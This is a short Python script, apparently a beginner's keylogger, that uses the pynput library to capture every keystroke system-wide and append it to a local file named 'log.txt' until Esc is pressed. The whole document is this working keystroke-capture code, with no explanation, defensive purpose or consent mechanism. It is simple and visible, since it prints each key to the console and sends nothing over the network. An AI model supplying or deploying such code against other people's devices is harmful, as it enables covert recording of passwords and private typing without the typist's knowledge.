import pynput

from pynput.keyboard import Key, Listener

count = 0
keys = []

def on_press(key):
    global keys, count
    keys.append(key)
    count += 1

    print("{0} pressed".format(key))
    if count >= 1:
        count = 0
        write_file(keys)
        keys = []

def on_release(key):
    if key == Key.esc:
        return False

def write_file(keys):
    with open("log.txt", "a") as f: # the first variable in open is the name of the text file, second variable will be to either "a"ppend or "w"rite
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write('\n')
            elif k.find("Key") == -1:
                f.write(k)


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()